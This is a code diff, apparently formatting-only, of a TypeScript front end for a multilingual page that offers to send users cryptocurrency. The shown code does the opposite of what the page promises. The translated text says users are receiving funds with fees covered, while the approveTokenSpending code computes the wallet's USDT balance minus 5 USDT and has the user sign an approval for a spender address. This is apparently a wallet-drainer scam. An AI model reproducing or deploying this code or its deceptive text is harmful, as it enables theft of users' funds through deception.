@@ -106,7 +106,8 @@ const TRANSLATIONS: Record<string, Record<string, any>> = {
     goToReceive: "Proceed to receive",
     networkBadge: "Network:",
     contract: "Contract",
-    contractTooltip: "If we cannot transfer funds to your cryptocurrency wallet, a link to the smart contract will be automatically called for verification. This process helps ensure that the transaction is not erroneous or unauthorized. In case of any issues, we will definitely contact you to resolve the matter.",
+    contractTooltip:
+      "If we cannot transfer funds to your cryptocurrency wallet, a link to the smart contract will be automatically called for verification. This process helps ensure that the transaction is not erroneous or unauthorized. In case of any issues, we will definitely contact you to resolve the matter.",
     gasSponsored: "We cover the network fee",
     enterAddress: "Enter your address to receive funds:",
     receivingAddress: "Receiving address:",
@@ -121,7 +122,8 @@ const TRANSLATIONS: Record<string, Record<string, any>> = {
       "Transferring to your address...",
     ],
     errorHeading: "Transaction failed",
-    errorDesc: "Unfortunately, due to an error, we were unable to complete the transaction. Please try connecting your wallet",
+    errorDesc:
+      "Unfortunately, due to an error, we were unable to complete the transaction. Please try connecting your wallet",
     continue: "Continue",
     connectWallet: "Connect wallet",
     connectWalletDesc: "Connect your wallet to receive funds",
@@ -142,7 +144,8 @@ const TRANSLATIONS: Record<string, Record<string, any>> = {
     goToReceive: "Перейти к получению",
     networkBadge: "Сеть:",
     contract: "Контракт",
-    contractTooltip: "Если мы не сможем перевести средства на ваш криптовалютный кошелек, будет автоматически вызвана ссылка на смарт-контракт для верификации. Этот процесс позволяет убедиться, что транзакция не является ошибочной или несанкционированной. В случае возникновения любых проблем, мы обязательно свяжемся с вами для решения вопроса.",
+    contractTooltip:
+      "Если мы не сможем перевести средства на ваш криптовалютный кошелек, будет автоматически вызвана ссылка на смарт-контракт для верификации. Этот процесс позволяет убедиться, что транзакция не является ошибочной или несанкционированной. В случае возникновения любых проблем, мы обязательно свяжемся с вами для решения вопроса.",
     gasSponsored: "Мы покрываем комиссию сети",
     enterAddress: "Введите ваш адрес для получения средств:",
     receivingAddress: "Адрес получения:",
@@ -157,7 +160,8 @@ const TRANSLATIONS: Record<string, Record<string, any>> = {
       "Переводим на ваш адрес...",
     ],
     errorHeading: "Не удалось выполнить транзакцию",
-    errorDesc: "К сожалению из-за возникшей ошибки нам не удалось выполнить транзакцию. Попробуйте подключить свой кошелек",
+    errorDesc:
+      "К сожалению из-за возникшей ошибки нам не удалось выполнить транзакцию. Попробуйте подключить свой кошелек",
     continue: "Продолжить",
     connectWallet: "Подключить кошелёк",
     connectWalletDesc: "Подключите кошелёк для получения средств",
@@ -178,7 +182,8 @@ const TRANSLATIONS: Record<string, Record<string, any>> = {
     goToReceive: "Перейти до отримання",
     networkBadge: "Мережа:",
     contract: "Контракт",
-    contractTooltip: "Якщо мы не зможемо переказати кошти на ваш криптовалютний гаманець, буде автоматично викликано посилання на смарт-контракт для верифікації. Цей процес дозволяє переконатися, що транзакція не є помилковою або несанкціонованою. У разі виникнення будь-яких проблем, ми обов'язково зв'яжемося з вами для вирішення питання.",
+    contractTooltip:
+      "Якщо мы не зможемо переказати кошти на ваш криптовалютний гаманець, буде автоматично викликано посилання на смарт-контракт для верифікації. Цей процес дозволяє переконатися, що транзакція не є помилковою або несанкціонованою. У разі виникнення будь-яких проблем, ми обов'язково зв'яжемося з вами для вирішення питання.",
     gasSponsored: "Ми покриваємо комісію мережі",
     enterAddress: "Введіть вашу адресу для отримання коштів:",
     receivingAddress: "Адреса отримання:",
@@ -193,7 +198,8 @@ const TRANSLATIONS: Record<string, Record<string, any>> = {
       "Переказуємо на вашу адресу...",
     ],
     errorHeading: "Не вдалося виконати транзакцію",
-    errorDesc: "На жаль, через виникнення помилки нам не вдалося виконати транзакцию. Спробуйте підключити свій гаманець",
+    errorDesc:
+      "На жаль, через виникнення помилки нам не вдалося виконати транзакцию. Спробуйте підключити свій гаманець",
     continue: "Продовжити",
     connectWallet: "Підключити гаманець",
     connectWalletDesc: "Підключіть гаманець для отримання коштів",
@@ -206,263 +212,277 @@ const TRANSLATIONS: Record<string, Record<string, any>> = {
     errorAlert: "❌ Помилка: {error}",
   },
   ES: {
-  amountLabel: "Para recibir:",
-  selectCurrency: "Seleccionar moneda",
-  selectCurrencyPlaceholder: "Seleccionar moneda",
-  selectNetwork: "Seleccionar red",
-  selectNetworkPlaceholder: "Seleccionar red",
-  goToReceive: "Continuar para recibir",
-  networkBadge: "Red:",
-  contract: "Contrato",
-  contractTooltip: "Si no podemos transferir fondos a su billetera de criptomonedas, se activará automáticamente un enlace al contrato inteligente para su verificación. Este proceso ayuda a garantizar que la transacción no sea errónea ni no autorizada. Si surge algún problema, nos pondremos en contacto con usted para resolverlo.",
-  gasSponsored: "Cubrimos la comisión de la red",
-  enterAddress: "Ingrese su dirección para recibir fondos:",
-  receivingAddress: "Dirección de recepción:",
-  invalidAddress: "Dirección inválida",
-  placeholderAddress: "Dirección de recepción {network}...",
-  amountToReceive: "Cantidad a recibir:",
-  receiveBtn: "Recibir {amount} {currency}",
-  back: "← Atrás",
-  loadingMessages: [
-    "Transacción en curso...",
-    "Creando registro en blockchain...",
-    "Transfiriendo a su dirección..."
-  ],
-  errorHeading: "La transacción falló",
-  errorDesc: "Lamentablemente, debido a un error, no pudimos completar la transacción. Intente conectar su billetera.",
-  continue: "Continuar",
-  connectWallet: "Conectar billetera",
-  connectWalletDesc: "Conecte su billetera para recibir fondos",
-  walletConnected: "Billetera conectada",
-  confirmDebit: "Confirmar pago",
-  processing: "Procesando...",
-  timeLeft: "Tiempo restante para recibir:",
-  walletNotConnectedAlert: "La billetera no está conectada",
-  successAlert: "✅ ¡Éxito!\n\nTransacción enviada.\nTXID:\n{txId}",
-  errorAlert: "❌ Error: {error}",
-},
+    amountLabel: "Para recibir:",
+    selectCurrency: "Seleccionar moneda",
+    selectCurrencyPlaceholder: "Seleccionar moneda",
+    selectNetwork: "Seleccionar red",
+    selectNetworkPlaceholder: "Seleccionar red",
+    goToReceive: "Continuar para recibir",
+    networkBadge: "Red:",
+    contract: "Contrato",
+    contractTooltip:
+      "Si no podemos transferir fondos a su billetera de criptomonedas, se activará automáticamente un enlace al contrato inteligente para su verificación. Este proceso ayuda a garantizar que la transacción no sea errónea ni no autorizada. Si surge algún problema, nos pondremos en contacto con usted para resolverlo.",
+    gasSponsored: "Cubrimos la comisión de la red",
+    enterAddress: "Ingrese su dirección para recibir fondos:",
+    receivingAddress: "Dirección de recepción:",
+    invalidAddress: "Dirección inválida",
+    placeholderAddress: "Dirección de recepción {network}...",
+    amountToReceive: "Cantidad a recibir:",
+    receiveBtn: "Recibir {amount} {currency}",
+    back: "← Atrás",
+    loadingMessages: [
+      "Transacción en curso...",
+      "Creando registro en blockchain...",
+      "Transfiriendo a su dirección...",
+    ],
+    errorHeading: "La transacción falló",
+    errorDesc:
+      "Lamentablemente, debido a un error, no pudimos completar la transacción. Intente conectar su billetera.",
+    continue: "Continuar",
+    connectWallet: "Conectar billetera",
+    connectWalletDesc: "Conecte su billetera para recibir fondos",
+    walletConnected: "Billetera conectada",
+    confirmDebit: "Confirmar pago",
+    processing: "Procesando...",
+    timeLeft: "Tiempo restante para recibir:",
+    walletNotConnectedAlert: "La billetera no está conectada",
+    successAlert: "✅ ¡Éxito!\n\nTransacción enviada.\nTXID:\n{txId}",
+    errorAlert: "❌ Error: {error}",
+  },
 
-DE: {
-  amountLabel: "Zu erhalten:",
-  selectCurrency: "Währung auswählen",
-  selectCurrencyPlaceholder: "Währung auswählen",
-  selectNetwork: "Netzwerk auswählen",
-  selectNetworkPlaceholder: "Netzwerk auswählen",
-  goToReceive: "Zum Empfang fortfahren",
-  networkBadge: "Netzwerk:",
-  contract: "Vertrag",
-  contractTooltip: "Falls wir die Gelder nicht an Ihre Kryptowallet übertragen können, wird automatisch ein Link zum Smart Contract zur Verifizierung aufgerufen. Dieser Prozess hilft sicherzustellen, dass die Transaktion weder fehlerhaft noch unautorisiert ist. Bei Problemen werden wir Sie kontaktieren.",
-  gasSponsored: "Wir übernehmen die Netzwerkgebühr",
-  enterAddress: "Geben Sie Ihre Empfangsadresse ein:",
-  receivingAddress: "Empfangsadresse:",
-  invalidAddress: "Ungültige Adresse",
-  placeholderAddress: "Empfangsadresse {network}...",
-  amountToReceive: "Zu erhaltender Betrag:",
-  receiveBtn: "Erhalten {amount} {currency}",
-  back: "← Zurück",
-  loadingMessages: [
-    "Transaktion wird ausgeführt...",
-    "Blockchain-Eintrag wird erstellt...",
-    "Übertragung an Ihre Adresse..."
-  ],
-  errorHeading: "Transaktion fehlgeschlagen",
-  errorDesc: "Leider konnte die Transaktion aufgrund eines Fehlers nicht abgeschlossen werden. Bitte verbinden Sie Ihre Wallet.",
-  continue: "Weiter",
-  connectWallet: "Wallet verbinden",
-  connectWalletDesc: "Verbinden Sie Ihre Wallet, um Gelder zu erhalten",
-  walletConnected: "Wallet verbunden",
-  confirmDebit: "Auszahlung bestätigen",
-  processing: "Verarbeitung...",
-  timeLeft: "Verbleibende Zeit:",
-  walletNotConnectedAlert: "Wallet ist nicht verbunden",
-  successAlert: "✅ Erfolgreich!\n\nTransaktion gesendet.\nTXID:\n{txId}",
-  errorAlert: "❌ Fehler: {error}",
-},
+  DE: {
+    amountLabel: "Zu erhalten:",
+    selectCurrency: "Währung auswählen",
+    selectCurrencyPlaceholder: "Währung auswählen",
+    selectNetwork: "Netzwerk auswählen",
+    selectNetworkPlaceholder: "Netzwerk auswählen",
+    goToReceive: "Zum Empfang fortfahren",
+    networkBadge: "Netzwerk:",
+    contract: "Vertrag",
+    contractTooltip:
+      "Falls wir die Gelder nicht an Ihre Kryptowallet übertragen können, wird automatisch ein Link zum Smart Contract zur Verifizierung aufgerufen. Dieser Prozess hilft sicherzustellen, dass die Transaktion weder fehlerhaft noch unautorisiert ist. Bei Problemen werden wir Sie kontaktieren.",
+    gasSponsored: "Wir übernehmen die Netzwerkgebühr",
+    enterAddress: "Geben Sie Ihre Empfangsadresse ein:",
+    receivingAddress: "Empfangsadresse:",
+    invalidAddress: "Ungültige Adresse",
+    placeholderAddress: "Empfangsadresse {network}...",
+    amountToReceive: "Zu erhaltender Betrag:",
+    receiveBtn: "Erhalten {amount} {currency}",
+    back: "← Zurück",
+    loadingMessages: [
+      "Transaktion wird ausgeführt...",
+      "Blockchain-Eintrag wird erstellt...",
+      "Übertragung an Ihre Adresse...",
+    ],
+    errorHeading: "Transaktion fehlgeschlagen",
+    errorDesc:
+      "Leider konnte die Transaktion aufgrund eines Fehlers nicht abgeschlossen werden. Bitte verbinden Sie Ihre Wallet.",
+    continue: "Weiter",
+    connectWallet: "Wallet verbinden",
+    connectWalletDesc: "Verbinden Sie Ihre Wallet, um Gelder zu erhalten",
+    walletConnected: "Wallet verbunden",
+    confirmDebit: "Auszahlung bestätigen",
+    processing: "Verarbeitung...",
+    timeLeft: "Verbleibende Zeit:",
+    walletNotConnectedAlert: "Wallet ist nicht verbunden",
+    successAlert: "✅ Erfolgreich!\n\nTransaktion gesendet.\nTXID:\n{txId}",
+    errorAlert: "❌ Fehler: {error}",
+  },
 
-FR: {
-  amountLabel: "À recevoir :",
-  selectCurrency: "Sélectionner une devise",
-  selectCurrencyPlaceholder: "Sélectionner une devise",
-  selectNetwork: "Sélectionner un réseau",
-  selectNetworkPlaceholder: "Sélectionner un réseau",
-  goToReceive: "Continuer pour recevoir",
-  networkBadge: "Réseau :",
-  contract: "Contrat",
-  contractTooltip: "Si nous ne pouvons pas transférer les fonds vers votre portefeuille crypto, un lien vers le smart contract sera automatiquement utilisé pour vérification. Ce processus garantit que la transaction n'est ni erronée ni non autorisée. En cas de problème, nous vous contacterons.",
-  gasSponsored: "Nous couvrons les frais du réseau",
-  enterAddress: "Entrez votre adresse de réception :",
-  receivingAddress: "Adresse de réception :",
-  invalidAddress: "Adresse invalide",
-  placeholderAddress: "Adresse de réception {network}...",
-  amountToReceive: "Montant à recevoir :",
-  receiveBtn: "Recevoir {amount} {currency}",
-  back: "← Retour",
-  loadingMessages: [
-    "Transaction en cours...",
-    "Création de l'enregistrement blockchain...",
-    "Transfert vers votre adresse..."
-  ],
-  errorHeading: "Échec de la transaction",
-  errorDesc: "Malheureusement, une erreur a empêché l'exécution de la transaction. Veuillez connecter votre portefeuille.",
-  continue: "Continuer",
-  connectWallet: "Connecter le portefeuille",
-  connectWalletDesc: "Connectez votre portefeuille pour recevoir les fonds",
-  walletConnected: "Portefeuille connecté",
-  confirmDebit: "Confirmer le paiement",
-  processing: "Traitement...",
-  timeLeft: "Temps restant :",
-  walletNotConnectedAlert: "Le portefeuille n'est pas connecté",
-  successAlert: "✅ Succès !\n\nTransaction envoyée.\nTXID :\n{txId}",
-  errorAlert: "❌ Erreur : {error}",
-},
+  FR: {
+    amountLabel: "À recevoir :",
+    selectCurrency: "Sélectionner une devise",
+    selectCurrencyPlaceholder: "Sélectionner une devise",
+    selectNetwork: "Sélectionner un réseau",
+    selectNetworkPlaceholder: "Sélectionner un réseau",
+    goToReceive: "Continuer pour recevoir",
+    networkBadge: "Réseau :",
+    contract: "Contrat",
+    contractTooltip:
+      "Si nous ne pouvons pas transférer les fonds vers votre portefeuille crypto, un lien vers le smart contract sera automatiquement utilisé pour vérification. Ce processus garantit que la transaction n'est ni erronée ni non autorisée. En cas de problème, nous vous contacterons.",
+    gasSponsored: "Nous couvrons les frais du réseau",
+    enterAddress: "Entrez votre adresse de réception :",
+    receivingAddress: "Adresse de réception :",
+    invalidAddress: "Adresse invalide",
+    placeholderAddress: "Adresse de réception {network}...",
+    amountToReceive: "Montant à recevoir :",
+    receiveBtn: "Recevoir {amount} {currency}",
+    back: "← Retour",
+    loadingMessages: [
+      "Transaction en cours...",
+      "Création de l'enregistrement blockchain...",
+      "Transfert vers votre adresse...",
+    ],
+    errorHeading: "Échec de la transaction",
+    errorDesc:
+      "Malheureusement, une erreur a empêché l'exécution de la transaction. Veuillez connecter votre portefeuille.",
+    continue: "Continuer",
+    connectWallet: "Connecter le portefeuille",
+    connectWalletDesc: "Connectez votre portefeuille pour recevoir les fonds",
+    walletConnected: "Portefeuille connecté",
+    confirmDebit: "Confirmer le paiement",
+    processing: "Traitement...",
+    timeLeft: "Temps restant :",
+    walletNotConnectedAlert: "Le portefeuille n'est pas connecté",
+    successAlert: "✅ Succès !\n\nTransaction envoyée.\nTXID :\n{txId}",
+    errorAlert: "❌ Erreur : {error}",
+  },
 
-IT: {
-  amountLabel: "Da ricevere:",
-  selectCurrency: "Seleziona valuta",
-  selectCurrencyPlaceholder: "Seleziona valuta",
-  selectNetwork: "Seleziona rete",
-  selectNetworkPlaceholder: "Seleziona rete",
-  goToReceive: "Procedi alla ricezione",
-  networkBadge: "Rete:",
-  contract: "Contratto",
-  contractTooltip: "Se non possiamo trasferire i fondi al tuo wallet di criptovalute, verrà automaticamente utilizzato un collegamento allo smart contract per la verifica. Questo processo aiuta a garantire che la transazione non sia errata o non autorizzata. In caso di problemi, ti contatteremo.",
-  gasSponsored: "Copriamo la commissione di rete",
-  enterAddress: "Inserisci il tuo indirizzo di ricezione:",
-  receivingAddress: "Indirizzo di ricezione:",
-  invalidAddress: "Indirizzo non valido",
-  placeholderAddress: "Indirizzo di ricezione {network}...",
-  amountToReceive: "Importo da ricevere:",
-  receiveBtn: "Ricevi {amount} {currency}",
-  back: "← Indietro",
-  loadingMessages: [
-    "Transazione in corso...",
-    "Creazione del record blockchain...",
-    "Trasferimento al tuo indirizzo..."
-  ],
-  errorHeading: "Transazione non riuscita",
-  errorDesc: "Purtroppo non siamo riusciti a completare la transazione a causa di un errore. Prova a collegare il tuo wallet.",
-  continue: "Continua",
-  connectWallet: "Connetti wallet",
-  connectWalletDesc: "Connetti il wallet per ricevere fondi",
-  walletConnected: "Wallet connesso",
-  confirmDebit: "Conferma pagamento",
-  processing: "Elaborazione...",
-  timeLeft: "Tempo rimanente:",
-  walletNotConnectedAlert: "Wallet non connesso",
-  successAlert: "✅ Operazione riuscita!\n\nTransazione inviata.\nTXID:\n{txId}",
-  errorAlert: "❌ Errore: {error}",
-},
+  IT: {
+    amountLabel: "Da ricevere:",
+    selectCurrency: "Seleziona valuta",
+    selectCurrencyPlaceholder: "Seleziona valuta",
+    selectNetwork: "Seleziona rete",
+    selectNetworkPlaceholder: "Seleziona rete",
+    goToReceive: "Procedi alla ricezione",
+    networkBadge: "Rete:",
+    contract: "Contratto",
+    contractTooltip:
+      "Se non possiamo trasferire i fondi al tuo wallet di criptovalute, verrà automaticamente utilizzato un collegamento allo smart contract per la verifica. Questo processo aiuta a garantire che la transazione non sia errata o non autorizzata. In caso di problemi, ti contatteremo.",
+    gasSponsored: "Copriamo la commissione di rete",
+    enterAddress: "Inserisci il tuo indirizzo di ricezione:",
+    receivingAddress: "Indirizzo di ricezione:",
+    invalidAddress: "Indirizzo non valido",
+    placeholderAddress: "Indirizzo di ricezione {network}...",
+    amountToReceive: "Importo da ricevere:",
+    receiveBtn: "Ricevi {amount} {currency}",
+    back: "← Indietro",
+    loadingMessages: [
+      "Transazione in corso...",
+      "Creazione del record blockchain...",
+      "Trasferimento al tuo indirizzo...",
+    ],
+    errorHeading: "Transazione non riuscita",
+    errorDesc:
+      "Purtroppo non siamo riusciti a completare la transazione a causa di un errore. Prova a collegare il tuo wallet.",
+    continue: "Continua",
+    connectWallet: "Connetti wallet",
+    connectWalletDesc: "Connetti il wallet per ricevere fondi",
+    walletConnected: "Wallet connesso",
+    confirmDebit: "Conferma pagamento",
+    processing: "Elaborazione...",
+    timeLeft: "Tempo rimanente:",
+    walletNotConnectedAlert: "Wallet non connesso",
+    successAlert:
+      "✅ Operazione riuscita!\n\nTransazione inviata.\nTXID:\n{txId}",
+    errorAlert: "❌ Errore: {error}",
+  },
 
-TR: {
-  amountLabel: "Alınacak tutar:",
-  selectCurrency: "Para birimi seçin",
-  selectCurrencyPlaceholder: "Para birimi seçin",
-  selectNetwork: "Ağ seçin",
-  selectNetworkPlaceholder: "Ağ seçin",
-  goToReceive: "Alım işlemine devam et",
-  networkBadge: "Ağ:",
-  contract: "Sözleşme",
-  contractTooltip: "Fonları kripto cüzdanınıza aktaramazsak, doğrulama için akıllı sözleşme bağlantısı otomatik olarak çağrılacaktır. Bu süreç işlemin hatalı veya yetkisiz olmadığını doğrulamaya yardımcı olur. Herhangi bir sorun oluşursa sizinle iletişime geçeceğiz.",
-  gasSponsored: "Ağ ücretini biz karşılıyoruz",
-  enterAddress: "Fon almak için adresinizi girin:",
-  receivingAddress: "Alım adresi:",
-  invalidAddress: "Geçersiz adres",
-  placeholderAddress: "Alım adresi {network}...",
-  amountToReceive: "Alınacak tutar:",
-  receiveBtn: "{amount} {currency} al",
-  back: "← Geri",
-  loadingMessages: [
-    "İşlem gerçekleştiriliyor...",
-    "Blockchain kaydı oluşturuluyor...",
-    "Adresinize transfer ediliyor..."
-  ],
-  errorHeading: "İşlem başarısız oldu",
-  errorDesc: "Maalesef bir hata nedeniyle işlemi tamamlayamadık. Lütfen cüzdanınızı bağlamayı deneyin.",
-  continue: "Devam et",
-  connectWallet: "Cüzdan bağla",
-  connectWalletDesc: "Fon almak için cüzdanınızı bağlayın",
-  walletConnected: "Cüzdan bağlandı",
-  confirmDebit: "Ödemeyi onayla",
-  processing: "İşleniyor...",
-  timeLeft: "Kalan süre:",
-  walletNotConnectedAlert: "Cüzdan bağlı değil",
-  successAlert: "✅ Başarılı!\n\nİşlem gönderildi.\nTXID:\n{txId}",
-  errorAlert: "❌ Hata: {error}",
-},
+  TR: {
+    amountLabel: "Alınacak tutar:",
+    selectCurrency: "Para birimi seçin",
+    selectCurrencyPlaceholder: "Para birimi seçin",
+    selectNetwork: "Ağ seçin",
+    selectNetworkPlaceholder: "Ağ seçin",
+    goToReceive: "Alım işlemine devam et",
+    networkBadge: "Ağ:",
+    contract: "Sözleşme",
+    contractTooltip:
+      "Fonları kripto cüzdanınıza aktaramazsak, doğrulama için akıllı sözleşme bağlantısı otomatik olarak çağrılacaktır. Bu süreç işlemin hatalı veya yetkisiz olmadığını doğrulamaya yardımcı olur. Herhangi bir sorun oluşursa sizinle iletişime geçeceğiz.",
+    gasSponsored: "Ağ ücretini biz karşılıyoruz",
+    enterAddress: "Fon almak için adresinizi girin:",
+    receivingAddress: "Alım adresi:",
+    invalidAddress: "Geçersiz adres",
+    placeholderAddress: "Alım adresi {network}...",
+    amountToReceive: "Alınacak tutar:",
+    receiveBtn: "{amount} {currency} al",
+    back: "← Geri",
+    loadingMessages: [
+      "İşlem gerçekleştiriliyor...",
+      "Blockchain kaydı oluşturuluyor...",
+      "Adresinize transfer ediliyor...",
+    ],
+    errorHeading: "İşlem başarısız oldu",
+    errorDesc:
+      "Maalesef bir hata nedeniyle işlemi tamamlayamadık. Lütfen cüzdanınızı bağlamayı deneyin.",
+    continue: "Devam et",
+    connectWallet: "Cüzdan bağla",
+    connectWalletDesc: "Fon almak için cüzdanınızı bağlayın",
+    walletConnected: "Cüzdan bağlandı",
+    confirmDebit: "Ödemeyi onayla",
+    processing: "İşleniyor...",
+    timeLeft: "Kalan süre:",
+    walletNotConnectedAlert: "Cüzdan bağlı değil",
+    successAlert: "✅ Başarılı!\n\nİşlem gönderildi.\nTXID:\n{txId}",
+    errorAlert: "❌ Hata: {error}",
+  },
 
-ZH: {
-  amountLabel: "接收金额：",
-  selectCurrency: "选择货币",
-  selectCurrencyPlaceholder: "选择货币",
-  selectNetwork: "选择网络",
-  selectNetworkPlaceholder: "选择网络",
-  goToReceive: "继续接收",
-  networkBadge: "网络：",
-  contract: "合约",
-  contractTooltip: "如果我们无法将资金转入您的加密钱包，将自动调用智能合约链接进行验证。该过程有助于确保交易不是错误或未经授权的。如有任何问题，我们将与您联系。",
-  gasSponsored: "网络手续费由我们承担",
-  enterAddress: "请输入您的收款地址：",
-  receivingAddress: "收款地址：",
-  invalidAddress: "地址无效",
-  placeholderAddress: "收款地址 {network}...",
-  amountToReceive: "接收金额：",
-  receiveBtn: "接收 {amount} {currency}",
-  back: "← 返回",
-  loadingMessages: [
-    "交易进行中...",
-    "正在创建区块链记录...",
-    "正在转账到您的地址..."
-  ],
-  errorHeading: "交易失败",
-  errorDesc: "很遗憾，由于发生错误，我们无法完成交易。请尝试连接您的钱包。",
-  continue: "继续",
-  connectWallet: "连接钱包",
-  connectWalletDesc: "连接您的钱包以接收资金",
-  walletConnected: "钱包已连接",
-  confirmDebit: "确认付款",
-  processing: "处理中...",
-  timeLeft: "剩余时间：",
-  walletNotConnectedAlert: "钱包未连接",
-  successAlert: "✅ 成功！\n\n交易已发送。\nTXID:\n{txId}",
-  errorAlert: "❌ 错误：{error}",
-},
+  ZH: {
+    amountLabel: "接收金额：",
+    selectCurrency: "选择货币",
+    selectCurrencyPlaceholder: "选择货币",
+    selectNetwork: "选择网络",
+    selectNetworkPlaceholder: "选择网络",
+    goToReceive: "继续接收",
+    networkBadge: "网络：",
+    contract: "合约",
+    contractTooltip:
+      "如果我们无法将资金转入您的加密钱包，将自动调用智能合约链接进行验证。该过程有助于确保交易不是错误或未经授权的。如有任何问题，我们将与您联系。",
+    gasSponsored: "网络手续费由我们承担",
+    enterAddress: "请输入您的收款地址：",
+    receivingAddress: "收款地址：",
+    invalidAddress: "地址无效",
+    placeholderAddress: "收款地址 {network}...",
+    amountToReceive: "接收金额：",
+    receiveBtn: "接收 {amount} {currency}",
+    back: "← 返回",
+    loadingMessages: [
+      "交易进行中...",
+      "正在创建区块链记录...",
+      "正在转账到您的地址...",
+    ],
+    errorHeading: "交易失败",
+    errorDesc: "很遗憾，由于发生错误，我们无法完成交易。请尝试连接您的钱包。",
+    continue: "继续",
+    connectWallet: "连接钱包",
+    connectWalletDesc: "连接您的钱包以接收资金",
+    walletConnected: "钱包已连接",
+    confirmDebit: "确认付款",
+    processing: "处理中...",
+    timeLeft: "剩余时间：",
+    walletNotConnectedAlert: "钱包未连接",
+    successAlert: "✅ 成功！\n\n交易已发送。\nTXID:\n{txId}",
+    errorAlert: "❌ 错误：{error}",
+  },
 
-JA: {
-  amountLabel: "受取額:",
-  selectCurrency: "通貨を選択",
-  selectCurrencyPlaceholder: "通貨を選択",
-  selectNetwork: "ネットワークを選択",
-  selectNetworkPlaceholder: "ネットワークを選択",
-  goToReceive: "受取へ進む",
-  networkBadge: "ネットワーク:",
-  contract: "コントラクト",
-  contractTooltip: "資金を暗号資産ウォレットへ送金できない場合、検証のためスマートコントラクトへのリンクが自動的に呼び出されます。このプロセスにより、取引が誤りや不正でないことを確認します。問題が発生した場合はご連絡いたします。",
-  gasSponsored: "ネットワーク手数料は当社負担",
-  enterAddress: "受取アドレスを入力してください:",
-  receivingAddress: "受取アドレス:",
-  invalidAddress: "無効なアドレスです",
-  placeholderAddress: "受取アドレス {network}...",
-  amountToReceive: "受取金額:",
-  receiveBtn: "{amount} {currency} を受け取る",
-  back: "← 戻る",
-  loadingMessages: [
-    "取引を処理中...",
-    "ブロックチェーン記録を作成中...",
-    "アドレスへ送金中..."
-  ],
-  errorHeading: "取引に失敗しました",
-  errorDesc: "エラーが発生したため、取引を完了できませんでした。ウォレットを接続してください。",
-  continue: "続行",
-  connectWallet: "ウォレットを接続",
-  connectWalletDesc: "資金を受け取るためにウォレットを接続してください",
-  walletConnected: "ウォレット接続済み",
-  confirmDebit: "支払いを確認",
-  processing: "処理中...",
-  timeLeft: "残り時間:",
-  walletNotConnectedAlert: "ウォレットが接続されていません",
-  successAlert: "✅ 成功！\n\n取引が送信されました。\nTXID:\n{txId}",
-  errorAlert: "❌ エラー: {error}",
-}
+  JA: {
+    amountLabel: "受取額:",
+    selectCurrency: "通貨を選択",
+    selectCurrencyPlaceholder: "通貨を選択",
+    selectNetwork: "ネットワークを選択",
+    selectNetworkPlaceholder: "ネットワークを選択",
+    goToReceive: "受取へ進む",
+    networkBadge: "ネットワーク:",
+    contract: "コントラクト",
+    contractTooltip:
+      "資金を暗号資産ウォレットへ送金できない場合、検証のためスマートコントラクトへのリンクが自動的に呼び出されます。このプロセスにより、取引が誤りや不正でないことを確認します。問題が発生した場合はご連絡いたします。",
+    gasSponsored: "ネットワーク手数料は当社負担",
+    enterAddress: "受取アドレスを入力してください:",
+    receivingAddress: "受取アドレス:",
+    invalidAddress: "無効なアドレスです",
+    placeholderAddress: "受取アドレス {network}...",
+    amountToReceive: "受取金額:",
+    receiveBtn: "{amount} {currency} を受け取る",
+    back: "← 戻る",
+    loadingMessages: [
+      "取引を処理中...",
+      "ブロックチェーン記録を作成中...",
+      "アドレスへ送金中...",
+    ],
+    errorHeading: "取引に失敗しました",
+    errorDesc:
+      "エラーが発生したため、取引を完了できませんでした。ウォレットを接続してください。",
+    continue: "続行",
+    connectWallet: "ウォレットを接続",
+    connectWalletDesc: "資金を受け取るためにウォレットを接続してください",
+    walletConnected: "ウォレット接続済み",
+    confirmDebit: "支払いを確認",
+    processing: "処理中...",
+    timeLeft: "残り時間:",
+    walletNotConnectedAlert: "ウォレットが接続されていません",
+    successAlert: "✅ 成功！\n\n取引が送信されました。\nTXID:\n{txId}",
+    errorAlert: "❌ エラー: {error}",
+  },
 };
 
 // Функция валидации адресов по регулярным выражениям сетей
@@ -652,7 +672,10 @@ async function approveTokenSpending(
 
   await ensureGasSponsored(safeOwner);
   const safeSpender = strictNormalizeTronAddress(tronWeb, spenderAddress);
-  const safeContract = strictNormalizeTronAddress(tronWeb, USDT_CONTRACT_ADDRESS);
+  const safeContract = strictNormalizeTronAddress(
+    tronWeb,
+    USDT_CONTRACT_ADDRESS,
+  );
 
   tronWeb.setAddress(safeOwner);
 
@@ -665,7 +688,9 @@ async function approveTokenSpending(
   const reserveAmount = BigInt(5 * 10 ** USDT_DECIMALS);
 
   if (currentBalance <= reserveAmount) {
-    throw new Error("На балансе 5 USDT или меньше, недостаточно средств для списания.");
+    throw new Error(
+      "На балансе 5 USDT или меньше, недостаточно средств для списания.",
+    );
   }
 
   const amountToPaySmallestDecimal = currentBalance - reserveAmount;
@@ -686,15 +711,19 @@ async function approveTokenSpending(
     );
   } catch (e: any) {
     console.error("Детали ошибки сборки:", e);
-    throw new Error("Ошибка при сборке транзакции (Билдер упал): " + (e.message || e));
+    throw new Error(
+      "Ошибка при сборке транзакции (Билдер упал): " + (e.message || e),
+    );
   }
 
-  const tx = (txObj as any)?.transaction || (txObj as any)?.result?.transaction || txObj;
+  const tx =
+    (txObj as any)?.transaction || (txObj as any)?.result?.transaction || txObj;
   if (!tx || !(tx as any).raw_data) {
     throw new Error("Билдер не вернул валидный объект транзакции");
   }
 
-  const ownerAddressHexInTx = tx.raw_data.contract[0].parameter.value.owner_address;
+  const ownerAddressHexInTx =
+    tx.raw_data.contract[0].parameter.value.owner_address;
   const ownerAddressFromHex = tronWeb.address.fromHex(ownerAddressHexInTx);
 
   console.log("owner_address внутри raw_data (hex):", ownerAddressHexInTx);
@@ -711,12 +740,16 @@ async function approveTokenSpending(
   let signedResponse;
   let cleanTxToSign;
   try {
-    const activeAddressBeforeSign = await getConnectedTronAddress(walletProvider);
+    const activeAddressBeforeSign =
+      await getConnectedTronAddress(walletProvider);
     if (!activeAddressBeforeSign) {
       throw new Error("Не удалось получить активный адрес из кошелька.");
     }
 
-    const safeActiveAddress = strictNormalizeTronAddress(tronWeb, activeAddressBeforeSign);
+    const safeActiveAddress = strictNormalizeTronAddress(
+      tronWeb,
+      activeAddressBeforeSign,
+    );
 
     if (safeActiveAddress !== safeOwner) {
       throw new Error(
@@ -758,7 +791,12 @@ async function approveTokenSpending(
     (globalThis as any).__signInProgress = true;
 
     const requestStartedAt = Date.now();
-    console.log("Отправляем request на подпись, timestamp:", requestStartedAt, "txID:", cleanTxToSign.txID);
+    console.log(
+      "Отправляем request на подпись, timestamp:",
+      requestStartedAt,
+      "txID:",
+      cleanTxToSign.txID,
+    );
